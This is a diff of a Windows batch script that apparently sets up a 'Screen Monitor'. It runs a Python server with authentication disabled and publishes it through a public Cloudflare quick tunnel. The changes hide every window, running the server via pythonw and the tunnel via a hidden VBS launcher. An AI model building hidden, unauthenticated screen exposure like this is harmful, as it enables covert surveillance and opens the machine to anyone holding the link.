@@ -1,18 +1,13 @@
 @echo off
 chcp 65001 >nul
-rem === Perezapusk samogo sebya v SVERNUTOM okne (imya faila i put - latinica) ===
-if not "%~1"=="MIN" (
-  start "Screen Monitor" /min cmd /c "%~f0" MIN
-  exit /b
-)
-
 cd /d "%~dp0"
-title Screen Monitor (svernuto - ne zakryvat)
+title Screen Monitor - nastroyka (okno zakroetsya samo)
 
-rem Latinskie imena failov - kirillica v putyah iz PowerShell nenadezhna
 set "LINKFILE=LINK.txt"
 set "ERRFILE=ERROR.txt"
 del "%LINKFILE%" "%ERRFILE%" >nul 2>nul
+
+echo Nastroyka monitoringa... okno zakroetsya avtomaticheski.
 
 rem --- 1. Python ---
 where python >nul 2>nul
@@ -23,7 +18,7 @@ if errorlevel 1 (
   exit /b 1
 )
 
-rem --- 2. Zavisimosti (v sistemnyy Python) ---
+rem --- 2. Zavisimosti ---
 python -m pip install --upgrade pip >nul 2>nul
 python -m pip install -r requirements.txt >nul 2>nul
 
@@ -34,14 +29,19 @@ if not exist cloudflared.exe powershell -Command "[Net.ServicePointManager]::Sec
 if not exist cloudflared.exe (
   > "%ERRFILE%" echo Ne udalos skachat cloudflared. Skachayte vruchnuyu:
   >> "%ERRFILE%" echo %CFURL%
-  >> "%ERRFILE%" echo pereimenuyte v cloudflared.exe, polozhite syuda i zapustite snova.
   start "" notepad "%ERRFILE%"
   exit /b 1
 )
 
-rem --- 4. Server v fone (bez parolya), log v fayl ---
+rem --- 4. Server v FONE bez okna (pythonw), tiho, bez parolya ---
 del server-log.txt >nul 2>nul
-start "" /b cmd /c "python server.py --no-auth > server-log.txt 2>&1"
+where pythonw >nul 2>nul
+if errorlevel 1 (
+  rem net pythonw - zapuskaem svernuto
+  start "" /min cmd /c "python server.py --no-auth --quiet > server-log.txt 2>&1"
+) else (
+  start "" pythonw server.py --no-auth --quiet
+)
 
 rem Zhdem do ~20 sekund, poka server nachnet slushat port 8000
 powershell -Command "for($i=0;$i -lt 20;$i++){ try{ (New-Object Net.Sockets.TcpClient).Connect('127.0.0.1',8000); exit 0 }catch{ Start-Sleep -Seconds 1 } }; exit 1"
@@ -51,16 +51,15 @@ if errorlevel 1 (
   exit /b 1
 )
 
-rem --- 5. Tunnel v fone, log v fayl ---
+rem --- 5. Tunnel v FONE bez okna (cherez skrytyy vbs) ---
 del cloudflared-log.txt >nul 2>nul
-start "" /b cmd /c ".\cloudflared.exe tunnel --url http://127.0.0.1:8000 > cloudflared-log.txt 2>&1"
+> run-tunnel.vbs echo CreateObject("WScript.Shell").Run "cmd /c .\cloudflared.exe tunnel --url http://127.0.0.1:8000 ^> cloudflared-log.txt 2^>^&1", 0, False
+start "" wscript.exe run-tunnel.vbs
 
-rem --- 6. Srazu sozdaem LINK.txt, potom dopisyvaem ssylku, kak tolko poyavitsya ---
-> "%LINKFILE%" echo Ssylka gotovitsya... podozhdite neskolko sekund i obnovite etot fayl.
-powershell -Command "$u=$null; for($i=0;$i -lt 40;$i++){ if(Test-Path 'cloudflared-log.txt'){ $m=Select-String -Path 'cloudflared-log.txt' -Pattern 'https://[a-z0-9-]+\.trycloudflare\.com' -ErrorAction SilentlyContinue | Select-Object -First 1; if($m){ $u=$m.Matches[0].Value; break } }; Start-Sleep -Seconds 1 }; if($u){ 'Otkroyte na telefone:',$u | Set-Content -Path '%LINKFILE%' -Encoding UTF8 } else { 'Ssylka poka ne gotova. Otkroyte okno iz paneli zadach i posmotrite cloudflared-log.txt' | Set-Content -Path '%LINKFILE%' -Encoding UTF8 }"
+rem --- 6. Dostaem ssylku iz loga i sohranyaem v LINK.txt ---
+> "%LINKFILE%" echo Ssylka gotovitsya... podozhdite i obnovite etot fayl.
+powershell -Command "$u=$null; for($i=0;$i -lt 40;$i++){ if(Test-Path 'cloudflared-log.txt'){ $m=Select-String -Path 'cloudflared-log.txt' -Pattern 'https://[a-z0-9-]+\.trycloudflare\.com' -ErrorAction SilentlyContinue | Select-Object -First 1; if($m){ $u=$m.Matches[0].Value; break } }; Start-Sleep -Seconds 1 }; if($u){ 'Otkroyte na telefone:',$u | Set-Content -Path '%LINKFILE%' -Encoding UTF8 } else { 'Ssylka poka ne gotova. Otkroyte cloudflared-log.txt i naydite trycloudflare.com' | Set-Content -Path '%LINKFILE%' -Encoding UTF8 }"
 start "" notepad "%LINKFILE%"
 
-rem --- 7. Derzhim okno zhivym (zakrytie okna = ostanovka vsego) ---
-:keepalive
-powershell -Command "Start-Sleep -Seconds 3600" >nul
-goto keepalive
+rem Vse rabotaet v fone. Eto okno bolshe ne nuzhno - zakryvaem.
+exit /b 0
